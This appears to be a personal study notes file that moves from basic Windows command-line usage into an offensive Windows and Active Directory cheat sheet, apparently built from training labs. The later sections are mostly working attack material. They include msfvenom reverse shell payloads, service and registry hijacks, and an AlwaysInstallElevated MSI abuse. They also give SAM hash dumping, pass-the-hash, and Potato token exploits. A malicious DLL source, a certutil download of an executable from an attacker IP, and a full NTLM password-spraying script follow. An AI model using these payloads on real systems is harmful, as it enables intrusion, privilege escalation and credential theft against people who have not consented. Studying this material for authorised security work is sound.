-------------------

### Learning Windows

-------------------

### Javac 

- `javac <file.java>` to compile a java file
- `java <file.java>` to run the file

### Displaying file contents

Use:
- `more <file name>`
- `type <file name>`

### Exit a terminal with

- `exit`


| **Commands**     |  **syntax**             |    **Actions**        |
|------------------|-------------------------|-----------------------|
|    dir           |    `dir`                |  List a directory     |                
|   cd             |   `cd <directory`       |  Change directory     |
|   cd ..          |   `cd ..`               | Move up a directory   |
|   move           |   `move file file`      | Move a file           |
|   copy           |  `copy file file`       | Copy a file           |
|   del            |   `del <file name>`     |  Delete a file        |  
|   mkdir          | `mkdir <directoryname>` | Make a directory      |

### Redirecting output

- Use `>` and `<`, Linux logic appplies to it,the same with  piping `|`


### Running a cmd shell as admin

- `powershell start cmd  -v runAs`

### Checking list of drivers

- `driverquery`

### Show your PC's details

- `systeminfo`

### Environmental Variables

- `set`

### Prompt

- To change your default text

 ![image](https://github.com/user-attachments/assets/2ee8b3d5-2f3a-47dd-aa3e-0e18548b41d8)

- use `prompt <what you want to do> $G`
- To revert, use `prompt`

### To copy to clipboard

- Just pipe the output of a file to clip e.g `dir | clip`

### Listing files and their extensions

- Use `assoc`

### Changing your cmd title window

- Use `title cmdbaby`

### Comparing 2 files

- Use `fc <file1> <file2>`

### Using `cipher`

- On a PC, deleted files remain accessible to you and other users. So, technically, they are not deleted under the hood.

   `cipher`

### Checking open ports, ip and states

- Use `netstat -an`

### shutdown a system
- Use `shutdown`
- `shutdown /r` will restart a system

### Clear a system shell

- Use `cls`

### Exit cmd

- Use `cmd`

### Rename a file

- use `ren <filename1> <filename2>`

### Creating a file

- use `echo <words> > filename.txt`

### Use `-help` to show a guide on  list

- `powercfg -help`

### To run the Deployment Image Service Management Tool

- Use `dism`

### Show the Serial Number and Label Info of the Current Drive

- Use `vol`

### Pinging an address

- Use `ping <addr>`

### Changing the terminal's color

- Use `color attr` to check a color's index
- use `color <number>` to change color

### Checking a wifi's password

- Use `netsh wlan show profiles` to check wifis previously connected to
- Then,`netsh wlan show profiles name="<wifi's name>" key=clear`

### Using `ipconfig` to check the machine's ip address

- run `ipconfig`
- This command also has extensions such as `ipconfig /release`, `ipconfig /renew`, and `ipconfig /flushdns` which you can use to troubleshoot issues with internet connections

### System file checker `sfc`

- Use `sfc /scannow` to check for corrupt files and repair them
  
### `Powercfg`
  You can use this command with its several extensions to show information about the power state of your PC. 

- `powercfg /energy` to generate a battery health report

### Starting a web address

- use `start <web addr>`

### Showing the tree of the current directory

- Use `tree`

### Os version

- Use `ver`

### Show open programs

- Use `tasklist`

### Killing open programs

- use `taskkill /IM "<program>" /F` to kill a program

### Showing date, time

- Use `date` to show data
- Use `time` to show time

### Using findstr to find a word in files 

- Use `findstr /S /C:"[word]" *.[filetype]

![image](https://github.com/user-attachments/assets/56c6792e-a0e0-48aa-846f-8dd1ccc9a2a3)
 
------------------------------

### REFERENCES:

- [Freecode camp](https://www.freecodecamp.org/news/command-line-commands-cli-tutorial/)

------------------------------

 
### Understanding Windows

### COnnecting to a remote desktop protocol, use `remmina` on linux 

![image](https://github.com/user-attachments/assets/914044ec-5759-49a0-b26e-7d81e24b40a6)

- Enter ip

![image](https://github.com/user-attachments/assets/a27b0ae2-64e2-4b51-8e7e-a5cd2e56ecca)

- Enter credentials


### Troubleshooting with Msconfig
  
  The System Configuration utility (MSConfig) is for advanced troubleshooting, and its main purpose is to help diagnose startup issues. 

- Use `windowskey + r` ,type `msconfig`

![image](https://github.com/user-attachments/assets/a6c81d7d-cdd4-422e-82e5-7316071f1650)

- Type `taskmgr to run the `task manager` get programs and background processes

![image](https://github.com/user-attachments/assets/83bd7c79-4909-4ce4-bb70-c6648443f897)

### Computer management

The Computer Management (compmgmt) utility has three primary sections: System Tools, Storage, and Services and Applications.

- Type `compmgmt.msc` in the `windowskey + r` dialog box
- The task scheduler is used to enable tasks at startup

![image](https://github.com/user-attachments/assets/0ab80421-0ccf-447d-a983-26205b412b12)

- Event viewer allows us to acccess logs of events hat occurred while using the system

![image](https://github.com/user-attachments/assets/b9a71b7f-e8df-4a18-a720-3bd51621324c)

- Shared folders shows shares or folders that users can have access to

![image](https://github.com/user-attachments/assets/67f17e12-3223-4885-8eb2-418dc68a9eaa)

- Checking `Local Users and Groups`, use `lusrmgr.msc` or check here

![image](https://github.com/user-attachments/assets/851f4af3-f32e-4f55-a017-26b326299fa8)

- Monitoring performance, use `perfmon.exe` or check

![image](https://github.com/user-attachments/assets/38a00f65-1080-421b-b9f5-b62de196e0ed)


### System Information

 - Windows includes a tool called Microsoft System Information (Msinfo32.exe).  This tool gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues

- The system information tab contains the `Environmental variables`.Environment variables store information about the operating system environment. This information includes details such as the operating system path, the number of processors used by the operating system, and the location of temporary folders.The environment variables store data that is used by the operating system and other programs. For example, the WINDIR environment variable contains the location of the Windows installation directory. Programs can query the value of this variable to determine where Windows operating system files are located.

![image](https://github.com/user-attachments/assets/5a841594-c065-4572-b54f-fd69176ceda1)

### Monitoring Resource

- The application  is known as `Resource Monitor` and the executable is `resmon.exe`.Resource Monitor displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules. Advanced filtering allows users to isolate the data related to one or more processes (either applications or services), start, stop, pause, and resume services, and close unresponsive applications from the user interface. It also includes a process analysis feature that can help identify deadlocked processes and file locking conflicts so that the user can attempt to resolve the conflict instead of closing an application and potentially losing data

![image](https://github.com/user-attachments/assets/0752dccc-96d7-43f1-afb0-fefa3aca77c4)


### Registry Editor [regedit.exe]

It is an hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices.

- One way to use regedit is `regedit` or `regedt32`.

  ![image](https://github.com/user-attachments/assets/12c25d18-9c07-453e-af44-40c365808f5e)


### Windows Privesc

- Connecting to rdps with `xfreerdp`

      xfreerdp /u:<user> /p:<password> /cert:ignore /v:<host>

### Generating and sending  revshells

- Generating a windows reverse shell executable

      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your ip> LPORT=<listening port> -f exe -o saucy.exe

- Setting up an smb server with python impacket

      python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

- Copy to the machine

      copy \\<your ip>\kali\<filename> <folder to send to>


### Abusing User's permissions

- To check a user's permission,use `accesschk.exe`

      accesschk.exe /accepteula -uwcqv user <service>

![image](https://github.com/user-attachments/assets/4b9a5bc3-af80-4f15-b6be-82f5b9be749c)

- Check if a binary runs with SYSTEM privileges

      sc qc [service name]
- Modify the config path to our reverseshell's path

      sc config [service name] binpath="\"<reverseshell path>\""

- Then net start `service name` to trigger it

![image](https://github.com/user-attachments/assets/1fa7dbed-e1de-4aa8-9bdb-44ded59ec6a2)

### Unquoted path services

- Exploiting services with unquoted paths

![image](https://github.com/user-attachments/assets/5115d234-5fe0-4daf-af3a-756660097559)

- Use `accesschk /accepteula -uwdq "[service name]"` to check for the user privileges

  ![image](https://github.com/user-attachments/assets/866a466f-3d86-4399-bb13-8087489395e6)

- Copy to the directory and rename with `Common.exe`

      copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

- use `net start [service}` to start shell.


### Weak Registry Permissions

- Write registry access can allow an attacker overwrite the image path registry key of a service . In this case service `regsvc` is vulnerable, group `NT AUTHORITY/INTERACTIVE` can overwrite registry Imagepath.

Command-:```accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc```

![image](https://github.com/user-attachments/assets/6a9b85dd-c13d-4760-85e9-436cbbad8ba8)

- Overwrite the image path

Command-:```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f```

- Then, use `net start regsvc` to start revshell

![image](https://github.com/user-attachments/assets/efcddbb2-7a35-4bbf-a8f6-7d01cb1b9bfd)


### Insecure Service Executables

- An attacker can swap a services's binary executable with system privileges if it is writable by everyone.

![image](https://github.com/user-attachments/assets/fc1972d0-a859-41b7-9c17-e60c52d5061e)

- Copy and replace the binary with

`copy [path] [path] /Y`

- Start the service with `net start filepermsvc


### Registry Autoruns

- Query with `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to query the registry for Autorun executables

![image](https://github.com/user-attachments/assets/e1d92284-a179-4105-9407-9a4821568a8d)

- Query with accesschk to see if it is writable by everyone

  Command-: ```C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"```

![image](https://github.com/user-attachments/assets/9d38a137-2369-456b-aeac-99ef3b93ffd4)

- Copy your reverse shell executable to the autorun executable path

- You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves


![image](https://github.com/user-attachments/assets/19321af4-8ba3-427d-afba-12c00530e99f)

### Using rdesktop to login to rdp

- Use `rdesktop -u [user] [ip]`
  

### Generating an msi payload with msfvenom

- Use:
  
      msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=[port] -f msi -o saucy.msi

![image](https://github.com/user-attachments/assets/2de086ab-a240-46df-b9b9-55baa9f1bde7)

### Registry AllElevated Keys

-  AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.

- To check this, use query `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` to check if the value is set to `1` or `0x1`.

![image](https://github.com/user-attachments/assets/e659baaa-85d0-45cf-ae60-a123bd769fa6)

- Generate `msi` with msfvenow syntax below-:

```bash
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
```
- Copy the msi payload and install with msiexec to trigger a reverse shelll

      msiexec /quiet /qn /i [msi's path]

- Shell

![image](https://github.com/user-attachments/assets/d8b07ea9-8e38-4e1f-a47f-4e2fb3497097)

- Sometimes you have to use the runas command to execute the file-: e.g Runas syntax-:

```cmd
runas /
user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-low
priv\priest.msi"
```

![image](https://github.com/user-attachments/assets/7eef7a01-f584-487f-ad95-0839a951c098)

- Revshell-:

![image](https://github.com/user-attachments/assets/5f13e619-deda-4a1f-a1f3-1b5c100ddfde)


### Saved passwords

- You can query registry for saved password

      reg query HKLM /f password /t REG_SZ /s

- or query to find admin AUTOLOGON credentials

      reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

- Spawn a cmd with admin privilege with `winexe`

      winexe -U '[user]%[password]' //[ip] cmd.exe

 ![image](https://github.com/user-attachments/assets/d1dedfcb-0c29-4d1d-8326-8de66e43a93f)

       
### Paaswords- Security Acount Manager (SAM)

- The SAM and SYSTEM files can be used to extract user password hashes
- Copy it to your machine

![image](https://github.com/user-attachments/assets/54334d3b-cc07-4119-83cd-f372acd2db77)

- Install credump7 to dump the hashes

      git clone https://github.com/Tib3rius/creddump7
      pip3 install pycrypto
      python3 creddump7/pwdump.py SYSTEM SAM

- Dump the hashes with pwdump.py

![image](https://github.com/user-attachments/assets/197fbbb0-c037-4ef0-b2db-62af6d48163d)

- Crack the NTLM(New Technology Lan Manager) hash with john

![image](https://github.com/user-attachments/assets/d9316e5c-d530-4b5c-a4e9-b0e2f2ebf4ca)

### Cracking with Hashcat

- Command-:``` hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt```

![image](https://github.com/user-attachments/assets/f1705fa8-15dc-4af9-b568-63210da6e1a1)

- Hashes result

![image](https://github.com/user-attachments/assets/d6f84f35-894d-4a50-93ab-b33ca79b9f45)


### Passing the hash

- You can use the hash to login instead of cracking the password,use `pth-winexe`

       pth-winexe -U "admin%[hash]" //[ip] cmd.exe

- Remember that the hash contains both the LM and NTLM hash seperated by colon

![image](https://github.com/user-attachments/assets/4ee7eeb2-ee1f-471d-9ba7-74cddfaa4f2d)

### Scheduled tasks

- An attacker can abuse a scheduled process running a script running as `SYSTEM` with write access.

![image](https://github.com/user-attachments/assets/59704788-9e65-4a01-a962-8fd5749966ce)

- Append a line that trigger our reverse shell

![image](https://github.com/user-attachments/assets/78abb9ec-d07f-43e7-be1a-5bc2b453dcd2)

- Reverse shell

![image](https://github.com/user-attachments/assets/fbc57a9b-54f1-49ac-88a3-ff9c37520e40)

### Insecure GUI apps

- Abusing `mspaint.exe`
- Double-click on the adminpaint shortcut
- Run this `tasklist /V | findstr mspaint.exe` to see if it is running with admin privileges

![image](https://github.com/user-attachments/assets/9284c76e-9c6a-4b6c-bcb9-fc1472de2c01)

- Click `file` and `open`.then paste this:`file://c:/windows/system32/cmd.exe`

![image](https://github.com/user-attachments/assets/321fe040-b73a-407a-a30c-c0294b50e1bf)

- Press enter to spawn a command prompt with admin privileges


### TOKEN IMPERSONATION-Rogue Potato

- Set up a socat redirector redirecting traffic from a port on your machine to another port on the victim machine

      sudo socat tcp-listen:[listening port],reuseaddr,fork tcp:[target-ip]:[port]

- Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account.

      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

![image](https://github.com/user-attachments/assets/bfd711a0-b618-4bec-86b8-11367034372f)

- Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

      C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999

- System shell

### Token Impersonation - PrintSpoofer

- Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
- Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

       c:\PrivEsc\PrintSpoofer.exe -i -c [rev shell's path]
  
![image](https://github.com/user-attachments/assets/980e676e-705f-4d15-9248-74d2c32f56d8)

- Use `whoami /priv` to check for privileges

![image](https://github.com/user-attachments/assets/baf8ab23-fbd5-408d-9eb4-2e5e967d324d)

- Privilege Escalation automation scripts

   - winPEASany.exe
   - Seatbelt.exe
   - PowerUp.ps1
   - SharpUp.exe



### OFFSEC
### Windows Access Control

- Privileges on the Windows Operating System refers to permissions of a specific user to perform system related local operations.e.g add users, modifying file system.

### Concepts

- Server Identifier `[SID]`
- Mandatory Integrity Control
- User Access Control
- Access Token

### Server Identifier

- A `SID` is a unique value assigned to a group and user and authenticated by windows.In the case of `users` and `groups`, it is generated by `Local Security Authority` while Doamin users and groups are created by the domain controller.The SID is generated when the user is creted and cannot be tampered with.
- A SID is represented by letters SRXY and `-` acts a delimeter

```S-R-X-Y```

- Literal `S` indicates that the string is an SID
- Literal `R`stands for `revision` and that the overall SID structure is at its initial version.it is always set to 1.
- “X” determines the identifier authority. This is the authority that issues the SID. For example, “5” is 
the most common value for the identifier authority. It specifies `NT Authority` and is used for local 
or domain users and groups.
- “Y” represents the sub authorities of the identifier authority. Every SID consists of one or more sub 
authorities. This part consists of the domain identifier and relative identifier (RID). The domain 
identifier is the SID of the domain for domain users, the SID of the local machine for local users, 
and “32” for built-in principals. The RID determines principals such as users or groups.

## Example of a SID

```S-1-5-21-1336799502-1441772794-948155058-1001```

- Relative identifiers start with 1000.RID `1001` will be for the second user created on the server.
- There are SIDs that have a RID under 1000, which are called well-known SIDs.These SIDs identify generic and built-in groups and users instead of specific groups and users.

      S-1-0-0 Nobody 
      S-1-1-0 Everybody
      S-1-5-11 Authenticated Users
      S-1-5-18 Local System
      S-1-5-domainidentifier-500 Administrator

### ACCESS TOKEN
- Once a user gets authenticaed by Windows,a token gets generated with set of attributes which limits the type of operation carried out by the user.
- When a user starts a process or thread, a token will be assigned to these objects. This token, called a primary token, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user
- A thread can also have an impersonation token assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. This means that the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.

### Mandatory Access Control

- It uses integrity levels to determine control access to securable objects.When processes are started,they receive the integrity levels of the principal while performing the operations.
- Processes run on 4 integrity levels

      System: SYSTEM (kernel, ...)
      High: Elevated users
      Medium: Standard users
      Low: very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data

### User Access Control

- UAC is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or filtered admin token), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a 
UAC consent prompt needs to be confirmed.

### SITUATIONAL AWARENESS

- This involves understanding  the nature of the windows system to identify potential vectors for privilege escalation.
- Important stuffs to check  are:

  - Username and hostname
  - Group memberships of the current user
  - Existing users and groups
  - Operating system, version and architecture
  - Network information
  - Installed applications
  - Running processes

### Groups

- Use `whoami /GROUPS` to display the groups that the current user is a member of

### Users

- The next piece of information we are interested in are other users and groups on the system. We can use the `net user` command or the `Get-LocalUser` Cmdlet to obtain a list of all local users. Let’s use the latter by starting PowerShell and running Get-LocalUser

```bash
  powershell
  Get-LocalUser
```
### Enumerating Local Groups

- Use command `net LocalGroup` or `Get-LocalGroup` in powershell

### Examples of groups

- Members of Backup Operators can backup and restore all files on a computer, even those files 
they don’t have permissions for.
- Members of Remote Desktop Users can access the system with RDP, while members of Remote 
Management Users can access it with WinRM.

### View the members of a group with `Get-LocalGroupMember`

- Syntax-: ```Get-LocalGroupMember <Group's name>```

### Check the operating system, version, and architecture

- Use `systeminfo`

### Identify network interfaces, routes andactive network connections

- To list all network interfaces,use `ifconfig /all`
- To display the routing tables, use `route print`
- To list all active network connections we can use netstat753 with the argument -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection.Use `netstat -ano`

### Checking installed applications on a system

- For 64-bit and 32-bit applications , use

      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"  | select displayname
      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  

- Finding running processes, use powershell `Get-Process` cmdlet
- The listed processes might not be complete.Check for files in the `c:/` directory
- Gather more data about user with `net user [username]`
- ` Remote Desktop Users or Remote Management Users` can access services like `RDP` or `WINRM`.
- Check Powershell history with-:`Get-History`
- Most Administrators use the Clear-History770 command to clear the PowerShell history. But this Cmdlet is only clearing PowerShell’s own history, which can be retrieved with Get-History. Starting with PowerShell v5, v5.1, and v7, a module named PSReadline771 is included, which is used for line-editing and command history functionality.Interestingly, Clear-History does not clear the command history recorded by `PSReadline`. Therefore, we can check if the user in our example misunderstood the Clear-History Cmdlet to clear all traces of previous commands.

```pwsh
(Get-PSReadlineOption).HistorySavePath
```

- 


------------------------------

### Using RUNAS

------------------------------

- If a user is not part of the group `remote desktop Users of Remote Management Users` but you have access to GUI.`Runas` can be used to spawn a command as a user.Syntax-:

```pwsh
runas /user:[username] cmd
```

--------------------------------

### Hidden in Plain view

-------------------------------

- Find files e.g ".txt,ini" with -: `Get-ChildItem`

```pwsh
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
-------------------------------

### Upgrading a shell to meterpreter

- Use

      use multi/manage/shell_to_meterpreter
      set SESSION 1
      set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
      set PLATFORM_OVERRIDE windows
      set PSH_ARCH_OVERRIDE x64

- Search for `search_to_meterpreter` with `search <keyword>`

![image](https://github.com/user-attachments/assets/3d6e3cb1-ba21-4fa1-a890-f2d729f60129)

- Type, `use 0` or `use <keyword>`

![image](https://github.com/user-attachments/assets/5eebe888-3445-4e08-8f1f-465fddbd6560)

- Use options to show options

![image](https://github.com/user-attachments/assets/b5a65c68-5508-457f-9117-a854cd2a6a82)

- Then,check for sessions with `sessions -i`

![image](https://github.com/user-attachments/assets/6b32651e-062f-4436-adba-7850146aaf24)

- RUn

![image](https://github.com/user-attachments/assets/918845c9-68fb-4d27-9c9e-a03df77f8e24)

### Using Msfconsole Hashdump rb script

- Shell must be a meterpreter shell,run `search "hashdump"` to search for hashdump and follow the process in a picture

![image](https://github.com/user-attachments/assets/35ad8d4e-a149-4bb4-a1ca-191e3908dd03)

- Result

![image](https://github.com/user-attachments/assets/bc8f3974-c833-4df7-ab61-bd5081fb4f26)

- Use `john` to crack the hash

      john --format=NT --wordlist=/home/sensei/rockyou.txt hashfile

![image](https://github.com/user-attachments/assets/b84b14f0-afde-4068-9c41-4aad6dbf3aa5)


--------------

### Using `certutil.exe` to copy files

`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`

--------------

### Abusing autoruns

- Run `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe` in cmd to check for `logon` autorun

![image](https://github.com/user-attachments/assets/df520e32-7cce-4f44-9348-19338d37fc80)

- Use `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program\program.exe" to check for permission.

![image](https://github.com/user-attachments/assets/f57d8100-6e70-4949-9bc4-1a9dd3d8a7d0)

- We have write access to the file,I exploited it by copying a revshell to replace it.

---------------

### Copying files to the attack machine

- Use

`copy <file> \\<ip>\<share>`

![image](https://github.com/user-attachments/assets/54e50dd4-507b-49c2-a60a-3a17484183ac)


### DLL Hijacking

- Open `Process Monitor` and check for a program missing a dll
- Create a malicious dll with `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme2.dll`

 ![image](https://github.com/user-attachments/assets/84c362fa-f3fa-47ab-9f39-a47c1dedc4a8)


- Copy the malicious dll to the location.

![image](https://github.com/user-attachments/assets/0e864d2f-9c76-4609-929a-2fedb9636b86)

- Then,use `sc` to start the service with `sc start <service>`.You can stop a service with `sc stop <service>`.

![image](https://github.com/user-attachments/assets/ee609183-86c9-4828-90db-0871fb1ddedb)

- Malicious code for the dll

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```
-------------------------

### Hot Potato exploitation for windows 7

![image](https://github.com/user-attachments/assets/25885a6e-ee43-4254-bd61-ca3e95858c89)

- Process-:
  - `powershell.exe -nop -ep bypass`
  - Import the `tater.ps1` script `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
  - Execute a command with the imported module `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`

- Check if it worked by running `net localgroup administrators`

![image](https://github.com/user-attachments/assets/4e388732-fed2-4187-9eb1-af7b07b79824)

-------------------------

### Reference-:

- [Tater's script repo](https://github.com/Kevin-Robertson/Tater)

-------------------------

### Password Mining Escalation - Memory

- Open command prompt and type: msfconsole
- In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
- In Metasploit (msf > prompt) type: set uripath x
- In Metasploit (msf > prompt) type: run

![image](https://github.com/user-attachments/assets/e5a34e1c-9a09-4b5a-bdf9-8526c3df4d33)

- Load the basic http site on internet explorer `iexplore.exe`

![image](https://github.com/user-attachments/assets/3e29ed28-18ac-421b-8c52-ca2b035095a9)

- Go to taskmgr `taskmgr.exe` and create a dump

![image](https://github.com/user-attachments/assets/3a4e8821-5d2e-4fc8-9ed3-a45bbd234403)

- Copy the dump and grep for `Authorization: Basic`



### AD Cheatsheet

[HTB](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)

-------------------------

### Learning AD exploitation

-------------------------

### DNS setting in Network Configuration

![image](https://github.com/user-attachments/assets/0ed25f47-948d-401a-86c9-39939b5b519f)

Remove 8.8.8.8

- Then, use `systemctl restart NetworkManager` to restart networkmanager


![image](https://github.com/user-attachments/assets/71c18d06-828f-4091-88df-4100e56fdd0b)

![image](https://github.com/user-attachments/assets/8432cd08-493b-4692-a414-0699e1065797)

- Services applying NTLM can sometimes be facing the internet e.g

```python3
    Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
    Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
    Exposed VPN endpoints that were integrated with AD.
    Web applications that are internet-facing and make use of NetNTLM.
 ```
- Script from thm to bruteforce credentials

```
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```

- Syntax-:

![image](https://github.com/user-attachments/assets/52714f8e-8a3a-434a-94cf-681784bf70de)

### LDAP Bind Credentials

- LDAP auth is similar to NTLM AYTH,the application directly verifies the user's crenetials.The application has a set of creds that it uses to verify the AD user's creds.Although, non-microsoft applications that integrates wuth AD uses it. e.g
 - Gitlab
 - Jenkins
 - Custom-developed web applications
 - Printers
 - Vpns

- If this services are exposed to the internet,the same attacks leveraged on NTLM can be applied.Although, it opens up an additional attack to to grab the credentials to gain authenticated access to AD.

- Authentication process

![image](https://github.com/user-attachments/assets/f13bbc4b-c220-4018-9115-d3840e6b9590)

### LDAP Pass-back Attacks

- LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

- Netcat cannot be used to grab the creds.We need to create a rogue server.
- Use binary slapd to create a rogue server.TO install,use

```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
#You will however have to configure your own rogue LDAP server on the AttackBox as well. We will start by reconfiguring the LDAP server using the following command:
sudo dpkg-reconfigure -p low slapd
```

- Config process,use

`sudo dpkg-reconfigure -p low slapd`

- Follow the process below

![image](https://github.com/user-attachments/assets/f28c0ec8-fb39-45ce-8d20-03ad15f07d9d)

![image](https://github.com/user-attachments/assets/b7d6542b-f161-46cc-8f4e-3d64da7ccfa8)

![image](https://github.com/user-attachments/assets/4f0a82ca-ee0b-4fb8-8b8e-fb7e09988dd2)

![image](https://github.com/user-attachments/assets/5964b8e8-cf73-43a9-b84d-b86d70d214e2)

![image](https://github.com/user-attachments/assets/7123846c-7ba5-40f1-8093-663a87f570ae)

![image](https://github.com/user-attachments/assets/3188414d-c7d1-4dea-b554-53f0238d29c3)

- Set the server to recieve plain LOGIN credentials with an `ldif` file.

```ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
- Config meaning
  
    olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

- Path up the server with the command below

